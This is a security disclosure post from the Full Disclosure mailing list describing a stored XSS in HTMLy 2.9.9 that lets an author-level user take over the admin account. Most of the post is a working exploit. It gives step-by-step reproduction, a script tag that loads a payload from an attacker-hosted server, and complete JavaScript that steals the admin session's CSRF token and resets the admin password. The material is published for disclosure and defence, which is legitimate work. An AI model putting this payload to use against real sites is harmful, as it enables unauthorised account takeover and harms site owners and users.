---
title: Stored XSS to Account Takeover - htmlyv2.9.9
url: https://seclists.org/fulldisclosure/2024/Sep/42
source: Full Disclosure
date: 2024-09-18
fetch_date: 2025-10-06T18:30:12.862165
---

# Stored XSS to Account Takeover - htmlyv2.9.9

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](41)
[By Date](date.html#42)
[![Next](/images/right-icon-16x16.png)](43)

[![Previous](/images/left-icon-16x16.png)](41)
[By Thread](index.html#42)
[![Next](/images/right-icon-16x16.png)](43)

![](/shared/images/nst-icons.svg#search)

# Stored XSS to Account Takeover - htmlyv2.9.9

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Mon, 16 Sep 2024 17:16:14 +0000

---

```
# Exploit Title: Stored XSS to Account Takeover - htmlyv2.9.9
# Date: 9/2024
# Exploit Author: Andrey Stoykov
# Version: 2.9.9
# Tested on: Ubuntu 22.04
# Blog:
https://msecureltd.blogspot.com/2024/08/friday-fun-pentest-series-9-stored-xss.html

Description:

- It was found that the application suffers from stored XSS

- Low level user having an "author" role can takeover admin account and
change their password via posting a malicious post with a reference to a
payload hosted on attacker domain

Stored XSS to Account Takeover #1:

Steps to Reproduce:

1. Visit "My Posts" > "Add New Post" > "Regular Post"
2. Enter the following payload into the "Content" referencing externally
hosted POC in Javascript:
 <script src="http://192.168.159.191:8000/xss.js";></script>
3. Upon visiting the blog post, the admin account password would be changed
to "test"
4. In the XSS payload pasted below need to adjust the "passwordChangeUrl",
"username" and "password"

// Javascript POC

// Function to fetch CSRF token and perform password change
    (function() {
        // URL of the password change page
        const passwordChangePageUrl = '
http://192.168.159.191/htmly/edit/password';;

        // Function to fetch the CSRF token
        function fetchCsrfToken() {
            fetch(passwordChangePageUrl, {
                method: 'GET',
                credentials: 'include' // Include cookies for the current
session
            })
            .then(response => response.text())
            .then(html => {
                // Parse the HTML to find the CSRF token
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const csrfTokenInput =
doc.querySelector('input[name="csrf_token"]');
                if (csrfTokenInput) {
                    const csrfToken = csrfTokenInput.value;
                    console.log('CSRF Token:', csrfToken);
                    changePassword(csrfToken);
                } else {
                    console.error('CSRF token not found');
                }
            })
            .catch(error => console.error('Error fetching CSRF token:',
error));
        }

        // Function to change the password
        function changePassword(csrfToken) {
            const postData = new URLSearchParams();
            postData.append('csrf_token', csrfToken);
            postData.append('username', 'admin');
            postData.append('password', 'test');

            fetch(passwordChangePageUrl, {
                method: 'POST',
                body: postData,
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                credentials: 'include' // Include cookies for the current
session
            })
            .then(response => response.text())
            .then(data => {
                console.log('Password change response:', data);
            })
            .catch(error => console.error('Error changing password:',
error));
        }

        // Trigger the CSRF token fetch and password change
        fetchCsrfToken();
    })();
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](41)
[By Date](date.html#42)
[![Next](/images/right-icon-16x16.png)](43)

[![Previous](/images/left-icon-16x16.png)](41)
[By Thread](index.html#42)
[![Next](/images/right-icon-16x16.png)](43)

### Current thread:

* **Stored XSS to Account Takeover - htmlyv2.9.9** *Andrey Stoykov (Sep 16)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")